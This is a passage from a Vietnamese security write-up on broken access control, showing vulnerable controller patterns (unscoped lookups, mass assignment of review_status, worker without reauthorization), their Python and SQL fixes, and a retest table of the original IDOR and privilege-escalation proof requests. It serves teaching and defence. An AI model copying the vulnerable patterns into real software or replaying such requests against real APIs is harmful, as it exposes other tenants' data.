Codebase sử dụng các method như `get_note(id)`, `get_case(id)`, `get_evidence(id)` và `model.update(request.json)` trước khi có đầy đủ authorization context. Một số controller kiểm tra organization membership, một số kiểm tra role, một số kiểm tra assignment, còn worker chỉ kiểm tra job ownership. Không check riêng lẻ nào trong số đó là đủ.

Điều này cũng giải thích vì sao một số control trên các code path liên quan vẫn hoạt động. Analyst có thể bị chặn khỏi Manager URL trong khi endpoint khác vẫn làm lộ object; direct evidence access có thể trả về 403 trong khi export vẫn thành công; ownership có thể được kiểm tra ở note object nhưng handler vẫn cho phép ghi vào protected property. Access control không hoàn toàn vắng mặt. Nó thiếu nhất quán giữa các chiều kiểm tra và giữa các path.

Đổi các fixture ID tuần tự thành UUID không thể sửa thiết kế này. Identifier khó đoán hơn có thể giảm khả năng phát hiện ngẫu nhiên, nhưng một khi identifier xuất hiện trong traffic, log, kết quả tìm kiếm, link, export hoặc response khác, unscoped lookup tương tự vẫn có thể bị khai thác.

## Thiết kế lại theo hướng an toàn

Quá trình khắc phục bắt đầu bằng việc biến Authorization thành operation bắt buộc ở service layer thay vì controller code tùy chọn. Route có thể phân tích đầu vào và trả đầu ra, nhưng không được trực tiếp sử dụng unrestricted repository cho resource được bảo vệ.

Thiết kế sử dụng một principal dùng chung và một denial primitive dựa trên membership hiện tại ở phía server:

```python
from dataclasses import dataclass
from enum import StrEnum

class Role(StrEnum):
    ANALYST = "analyst"
    MANAGER = "manager"
    OWNER = "owner"

class Forbidden(Exception):
    pass

class NotFound(Exception):
    pass

@dataclass(frozen=True)
class Membership:
    organization_id: str
    role: Role
    state: str

@dataclass(frozen=True)
class Principal:
    user_id: str
    memberships: tuple[Membership, ...]

    def active_membership(self, organization_id: str) -> Membership | None:
        return next(
            (
                membership
                for membership in self.memberships
                if membership.organization_id == organization_id
                and membership.state == "active"
            ),
            None,
        )

def require(condition: bool) -> None:
    if not condition:
        raise Forbidden()
```

Ứng dụng tải principal từ session và database state hiện tại trong mỗi request. Hệ thống không đưa ra authorization decision dựa trên stale role đã được sao chép vào long-lived client token.

### Khắc phục F-01: giới hạn note read theo relationship giữa subject và resource

Pattern chứa lỗ hổng tương đương với:

```python
note = notes.get_by_id(note_id)

require(current_user.is_member_of(note.organization_id))

return serialize(note)
```

Service sau khi sửa sẽ truy xuất note, xác định membership hiện tại và áp dụng ownership cho Analyst, đồng thời vẫn giữ quyền same-tenant rộng hơn cho Manager và Owner.

```python
def read_note(principal: Principal, note_id: str) -> dict:
    note = notes.get_by_id(note_id)
    if note is None:
        raise NotFound()

    membership = principal.active_membership(note.organization_id)
    if membership is None:
        raise NotFound()

    if membership.role is Role.ANALYST:
        require(note.owner_id == principal.user_id)
    elif membership.role not in {Role.MANAGER, Role.OWNER}:
        raise Forbidden()

    return serialize_note(note)
```

Trả về `404 Not Found` cho object nằm ngoài tenant của principal giúp giảm khả năng làm lộ sự tồn tại của object. Security property không phụ thuộc vào việc chọn 403 hay 404; điều quan trọng là phải từ chối relationship không được phép.

### Khắc phục F-02: allowlist writable property và tách riêng action approve

Handler chứa lỗ hổng tương đương với:

```python
note = notes.get_by_id(note_id)
require(can_update_note(principal, note))
note.update(request.json)
notes.save(note)
```

Schema cập nhật dành cho Analyst sau khi sửa chỉ chấp nhận các property mà Analyst được phép kiểm soát.

```python
from pydantic import BaseModel, ConfigDict

class AnalystNotePatch(BaseModel):
    model_config = ConfigDict(extra="forbid")

    title: str | None = None
    body: str | None = None

def update_analyst_note(
    principal: Principal,
    note_id: str,
    patch: AnalystNotePatch,
) -> dict:
    note = notes.get_by_id(note_id)
    if note is None:
        raise NotFound()

    membership = principal.active_membership(note.organization_id)
    require(membership is not None)
    require(membership.role is Role.ANALYST)
    require(note.owner_id == principal.user_id)

    changes = patch.model_dump(exclude_unset=True)
    note.apply(changes)
    notes.save(note)

    return serialize_note(note)
```

Việc approve trở thành một business action riêng với endpoint và policy riêng.

```python
def approve_note(principal: Principal, note_id: str) -> dict:
    note = notes.get_by_id(note_id)
    if note is None:
        raise NotFound()

    membership = principal.active_membership(note.organization_id)
    require(membership is not None)
    require(membership.role in {Role.MANAGER, Role.OWNER})
    require(note.review_status == "draft")

    note.review_status = "approved"
    note.status_changed_by = principal.user_id
    notes.save(note)

    return serialize_review_record(note)
```

Thiết kế này ngăn object-update permission quá rộng âm thầm cấp quyền ghi vào mọi property của model.

### Khắc phục F-03: đưa tenant scope vào quá trình truy xuất resource

Trong implementation có lỗ hổng, Manager endpoint thực hiện role check rồi global lookup:

```python
require(current_membership.role in {Role.MANAGER, Role.OWNER})
case = cases.get_by_id(case_id)
return serialize(case)
```

Repository sau khi sửa bắt buộc organization scope phải xuất hiện ngay trong query.

```python
def read_manager_case(
    principal: Principal,
    organization_id: str,
    case_id: str,
) -> dict:
    membership = principal.active_membership(organization_id)
    require(membership is not None)
    require(membership.role in {Role.MANAGER, Role.OWNER})

    case = cases.get_by_id_and_organization(
        case_id=case_id,
        organization_id=organization_id,
    )
    if case is None:
        raise NotFound()

    return serialize_case(case)
```

Organization identifier được lấy từ membership đã xác thực do server lựa chọn, không phải bằng cách tin tưởng một client header như `X-Organization-ID`. Giá trị active organization do client cung cấp có thể chọn trong số những membership mà người dùng thực sự sở hữu, nhưng không thể tạo membership trong một tenant mới.

### Khắc phục F-04: query toàn bộ nested relationship

Nested path chứa lỗ hổng kiểm tra quyền đối với parent rồi truy xuất child một cách độc lập:

```python
case = cases.get_by_id(case_id)
require(can_read_case(principal, case))

evidence = evidence_repository.get_by_id(evidence_id)
return serialize(evidence)
```

Query sau khi sửa mã hóa relationship được khai báo ngay trong database lookup, rồi mới áp dụng assignment policy.

```python
def read_nested_evidence(
    principal: Principal,
    organization_id: str,
    case_id: str,
    evidence_id: str,
) -> dict:
    membership = principal.active_membership(organization_id)
    require(membership is not None)

    case = cases.get_by_id_and_organization(
        case_id=case_id,
        organization_id=organization_id,
    )
    if case is None:
        raise NotFound()

    if membership.role is Role.ANALYST:
        require(case.assigned_analyst_id == principal.user_id)
    else:
        require(membership.role in {Role.MANAGER, Role.OWNER})

    evidence = evidence_repository.get_by_full_relationship(
        evidence_id=evidence_id,
        case_id=case_id,
        organization_id=organization_id,
    )
    if evidence is None:
        raise NotFound()

    return serialize_evidence(evidence)
```

Database implementation có thể thực thi cùng security property bằng joined query:

```sql
SELECT e.*
FROM evidence AS e
JOIN cases AS c ON c.id = e.case_id
WHERE e.id = :evidence_id
  AND c.id = :case_id
  AND c.organization_id = :organization_id;
```

Child không còn có thể bị ghép vào một accessible parent không liên quan.

### Khắc phục F-05: kiểm tra Authorization trước khi đưa job vào queue và kiểm tra lại trong worker

Trong implementation có lỗ hổng, API chỉ kiểm tra người dùng có được phép tạo export job hay không. Worker tin tưởng source ID đã lưu và sử dụng global repository.

API sau khi sửa truy xuất source và kiểm tra Authorization trước khi tạo job.

```python
def create_evidence_export(
    principal: Principal,
    evidence_id: str,
    export_format: str,
) -> dict:
    evidence = evidence_repository.get_by_id(evidence_id)
    if evidence is None:
        raise NotFound()

    case = cases.get_by_id(evidence.case_id)
    if case is None:
        raise NotFound()

    require(can_read_evidence(principal, case, evidence))

    job = export_jobs.create(
        actor_user_id=principal.user_id,
        source_type="evidence",
        source_id=evidence.id,
        organization_id=evidence.organization_id,
        export_format=export_format,
        authorization_action="evidence.export",
    )

    queue.publish(job.id)
    return serialize_export_job(job)
```

Worker tải lại authorization state hiện tại thay vì coi Authorization tại thời điểm queueing là có hiệu lực vĩnh viễn. Cách làm này bao phủ các tình huống membership bị xóa, role bị hạ, case được phân công lại hoặc resource được chuyển trong khoảng thời gian từ lúc đưa job vào queue đến lúc thực thi.

```python
def run_export_job(job_id: str) -> None:
    job = export_jobs.get_by_id(job_id)
    if job is None:
        return

    principal = principals.load_current(job.actor_user_id)
    evidence = evidence_repository.get_by_id(job.source_id)

    if evidence is None:
        export_jobs.fail(job.id, reason="source_not_found")
        return

    case = cases.get_by_id(evidence.case_id)
    if case is None or not can_read_evidence(principal, case, evidence):
        export_jobs.fail(job.id, reason="authorization_denied")
        audit.write(
            action="export.denied",
            actor_user_id=principal.user_id,
            resource_id=job.source_id,
        )
        return

    output = render_evidence_export(evidence, job.export_format)
    export_storage.save(job.id, output)
    export_jobs.complete(job.id)
```

Download endpoint cũng kiểm tra lại job ownership và source authorization, vì vậy việc sở hữu job ID không được coi là quyền lấy đầu ra.

```python
def download_export(principal: Principal, job_id: str) -> bytes:
    job = export_jobs.get_by_id(job_id)
    if job is None:
        raise NotFound()

    require(job.actor_user_id == principal.user_id)

    evidence = evidence_repository.get_by_id(job.source_id)
    case = cases.get_by_id(evidence.case_id) if evidence else None
    require(evidence is not None and case is not None)
    require(can_read_evidence(principal, case, evidence))

    return export_storage.read(job.id)
```

### Các enforcement rule được áp dụng cho phần còn lại của ứng dụng

Các policy function tương tự được áp dụng cho REST, GraphQL, batch operation, search, download, preview, export và administrative endpoint. Các HTTP method khác nhau không mặc nhiên kế thừa Authorization của nhau: `GET`, `PATCH` và `DELETE` đều khai báo action bắt buộc tương ứng. Batch handler kiểm tra Authorization cho từng item và fail closed thay vì âm thầm lọc bỏ item, trừ khi việc lọc là product rule rõ ràng.

Ứng dụng cũng bổ sung các automated regression test dùng hai account. Mỗi legitimate request đã thu thập được gửi lại lần lượt với một identity khác có cùng role, một identity có role thấp hơn và một identity thuộc tenant khác. Mỗi test chỉ thay đổi một selector, đồng thời kiểm tra cả response lẫn việc không xuất hiện state change hoặc worker activity trái phép.

## Retest với các proof ban đầu

Retest environment được khôi phục về fixture ban đầu trước khi áp dụng bản build đã sửa. Mọi resource lại bắt đầu ở version 1, chưa có export job và cũng chưa có audit event.

| Retest | Request hoặc control | Trước khi sửa | Sau khi sửa | Server-side verification |
|---|---|---|---|---|
| Proof ban đầu của F-01 | Ben: `GET /api/v1/notes/note_02` | `200`, note của Alex được trả về | `404`, không trả về note body | Alex vẫn đọc `note_02` ở version 1 |
| Proof ban đầu của F-02 | Ben: `PATCH note_01` với `review_status: approved` | `200`, status thành `approved`, version 3 sau baseline | `422`, property bổ sung bị từ chối | Daniel đọc `note_01`; status vẫn là `draft`, version vẫn là 2 sau lần cập nhật `body` được phép |
| Proof ban đầu của F-03 | Daniel: `GET /api/v1/manager/cases/case_03` | `200`, case thuộc `org_02` được trả về | `404`, cross-tenant object không được truy xuất | Maya vẫn đọc `case_03` ở version 1 |
| Proof ban đầu của F-04 | Ben: nested `case_01/evidence/evidence_02` | `200`, child thuộc `case_02` được trả về | `404`, relationship sai không được truy xuất | Alex đọc `evidence_02` qua `case_02` ở version 1 |
| Proof ban đầu của F-05 | Ben: export `evidence_03` | `202`, job hoàn tất và download thành công | `403`, không tạo job | Audit query của Maya không trả về event nào liên quan đến Ben hoặc `evidence_03` |
| Positive control 1 | Ben: `GET /api/v1/notes/note_01` | `200` | `200` | Quyền truy cập note của chính Ben được giữ nguyên |
| Positive control 2 | Ben: cập nhật `note_01.body` | `200`, version 2 | `200`, version 2 | Quyền cập nhật property được phép vẫn được giữ nguyên |
| Positive control 3 | Daniel: đọc `case_02` trong `org_01` | `200` | `200` | Manager same-tenant scope được giữ nguyên |
| Positive control 4 | Ben: đọc `case_01/evidence_01` qua đúng nested path | `200` | `200` | Quyền truy cập qua parent-child relationship hợp lệ được giữ nguyên |
| Positive control 5 | Ben: export `evidence_01` | `202`, hoàn tất | `202`, hoàn tất | Asynchronous path đã được cấp quyền vẫn được giữ nguyên |
| Positive control 6 | Daniel: approve `note_01` sau lần cập nhật được phép của Ben | `200` | `200` | State transition chỉ dành cho Manager được giữ nguyên |

Bản build sau khi sửa từ chối mọi proof request ban đầu nhưng vẫn giữ nguyên các luồng hợp lệ theo role, ownership, assignment, relationship và export.

## Bài học thực tế

1. Xác thực subject, sau đó kiểm tra Authorization cho action một cách riêng biệt.
2. Đưa tenant scope vào resource query.
3. Kiểm tra Authorization cho property, không chỉ cho object.
4. Kiểm tra mọi relationship được biểu diễn trong nested path.
5. Áp dụng cùng một policy cho mọi direct access path và indirect access path.
6. Chỉ thay đổi một biến Authorization trong mỗi proof.
7. Xác minh tác động bằng account khác và server-side state.
8. Coi UUID là identifier, không phải access control.

## Kết luận

Quá trình đánh giá bắt đầu bằng một policy rõ ràng và một Authorization matrix sạch, sau đó lần lượt kiểm thử ownership, property, tenant scope, resource relationship và indirect execution mà không thay đổi nhiều biến cùng lúc. Năm response khác nhau cùng làm lộ một design defect: các Authorization check không đầy đủ bao quanh unrestricted object resolution và automatic property binding. Các policy function tập trung, scoped query, property allowlist, relationship-aware lookup và worker-side reauthorization đã loại bỏ các lỗ hổng mà không phá vỡ quyền truy cập hợp lệ. Retest quan trọng không kém các proof ban đầu, bởi một bản sửa an toàn vừa phải từ chối request không được phép, vừa phải giữ nguyên workflow đã được cấp quyền.

## Tài liệu tham khảo

- [OWASP API Security Top 10 — API1:2023 Broken Object Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)
- [OWASP API Security Top 10 — API3:2023 Broken Object Property Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/)
- [OWASP API Security Top 10 — API5:2023 Broken Function Level Authorization](https://owasp.org/API-Security/editions/2023/en/0xa5-broken-function-level-authorization/)
- [PortSwigger Web Security Academy — Access control vulnerabilities and privilege escalation](https://portswigger.net/web-security/access-control)
- [PortSwigger Web Security Academy — Insecure direct object references](https://portswigger.net/web-security/access-control/idor)
